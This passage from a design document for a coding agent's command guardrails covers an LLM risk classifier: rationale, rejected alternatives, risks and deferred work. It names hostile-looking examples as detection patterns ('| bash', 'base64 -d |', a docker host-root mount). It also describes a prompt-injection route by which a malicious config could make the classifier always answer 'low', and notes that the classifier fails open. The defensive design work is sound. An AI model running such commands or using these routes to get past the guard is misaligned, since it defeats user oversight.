#### Why Not Classify All Commands (Including Those with Violations)?

Commands that already have rule-based violations get a confirmation prompt from the deterministic layer. Adding a classifier assessment on top would:
1. Add latency to every flagged command (the user is already waiting for a prompt).
2. Potentially confuse the prompt with mixed rule-based and classifier violations.
3. Provide marginal value — the command is already flagged and the user must approve it.

The classifier's value is precisely for commands that pass deterministic checks but are still risky.

#### Why Full-Command Key for Classifier Session Approvals?

Unlike `denied_command` approvals (keyed by command name), classifier risk depends on the entire command — `docker run alpine ls` and `docker run -v /:/host alpine sh` have very different risk profiles. Keying by full command ensures session approvals are precise.

### Rejected Alternatives

#### Rejected: In-Process LLM Client
Building a direct HTTP client for model APIs would duplicate Pi's provider routing, auth, and retry logic. It would also require the extension to manage API keys directly, which is a security concern and maintenance burden.

#### Rejected: Built-In Heuristic Scorer (Standalone Phase 2)
A regex/heuristic scorer (checking for pipe-to-bash, base64 patterns, etc.) was considered as a simpler alternative. It was deferred because: (a) the `pi -p` approach covers heuristic cases AND novel patterns, (b) heuristic rules would need ongoing maintenance as new attack patterns emerge, and (c) the `pi -p` approach is simpler to implement (one subprocess call vs. a rule engine). Heuristics may be added later as a fast pre-filter before the LLM call if latency is a concern.

#### Rejected: Classifier Runs in Parallel with Deterministic Checks
Running the classifier concurrently with `checkBash()` was considered for latency. It was rejected because: (a) the classifier should not run if deterministic checks already flag the command, and (b) concurrent execution complicates the flow and wastes API calls/tokens for commands that would be flagged anyway.

#### Rejected: User-Configurable System Prompt
Allowing the user to customize the classifier's system prompt via config was rejected because it opens a prompt injection vector — a malicious project-level config could instruct the classifier to always return `"low"` risk.

---

## 11. Risks (Phase 2)

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| **Subprocess latency** exceeds user tolerance | Medium | Medium | Default 5s timeout; fail-open; classifier only runs for commands passing deterministic checks. User can lower timeout or disable. |
| **Model hallucination** returns incorrect risk level | Medium | Low | Classifier is advisory only — never the sole gate. False negatives: deterministic checks are the baseline. False positives: user can deny and the command proceeds without the classifier on next attempt via session approval. |
| **`pi` binary not resolvable** in subprocess | Low | Medium | Resolve via `process.argv[0]` or `Bun.argv[0]` (the running Pi process). Fallback to PATH lookup. Log clear error on failure. |
| **Recursive guardrails** on classifier subprocess | Low | High | Mitigated by `--no-extensions` flag on subprocess. Test this explicitly. |
| **API cost** from frequent classifier calls | Medium | Low | Recommend fast/cheap models (flash-lite, haiku). Classifier only fires for commands passing deterministic checks. Session approvals prevent re-classification. |
| **JSON parse failures** from model output | Medium | Low | Fail-open with warning. Strip markdown fences. Robust parsing. |
| **Phase 1 regression** from Phase 2 changes | Low | High | Classifier code is isolated in `classifier.ts`. Integration in `index.ts` is additive (new code path after existing checks). All 113 Phase 1 tests must continue passing. |

---

## 12. Deferred (Beyond Phase 2)

| Item | Reason for Deferral |
|------|-------------------|
| `onlyIfExists` for deny patterns | Useful but independent of classifier work. Can be added in a future enhancement pass. |
| Named rules with IDs | Config schema extension that doesn't interact with the classifier. Separate effort. |
| Classifier result caching across commands | Session approval covers exact-match repeat commands. Semantic caching (similar but not identical commands) requires embedding/similarity infrastructure — out of scope. |
| Classifier as pre-filter before deterministic checks | Current flow (deterministic first, classifier second) is simpler and avoids wasting classifier calls. Can be reconsidered if latency data warrants it. |
| Built-in heuristic pre-filter | Fast regex checks before the LLM call (e.g., detect `| bash`, `base64 -d |`) could skip the LLM for obvious cases. Deferred until latency data shows it's needed. |
| `/guardrails` interactive config modification | Slash command remains read-only. Interactive editing is a separate UX effort. |

---

## 13. References

- Current implementation: `extensions/guardrails/` (`index.ts`, `bash-guard.ts`, `path-guard.ts`, `shell-ast.ts`, `config.ts`, `effective-cwd.ts`, `types.ts`, `session-allow-list.ts`, `confirmation-ui.ts`, `test-utils.ts`)
- Research: `extensions/AGENT_PERMISSION_SYSTEMS_RESEARCH.md`
- Quick start: `extensions/GUARDRAILS_QUICK_START.md`
- Phase 1 plan: `.ai/guardrails-permission-redesign-plan.md`
- Phase 1 review: `.ai/guardrails-permission-redesign-review.md`
- Archived implementation plan: `.ai/archive/2026-03-25-guardrails-extension.md`
- Archived comparison: `.ai/archive/2026-03-25-guardrails-comparison.md`
- Pi CLI reference: `pi --help` — `-p` / `--print` flag for non-interactive mode
- Pi Extension API docs: `@mariozechner/pi-coding-agent` package
- Feature anchor: `.ai/current-work.md` (slug: `guardrails-permission-redesign`)
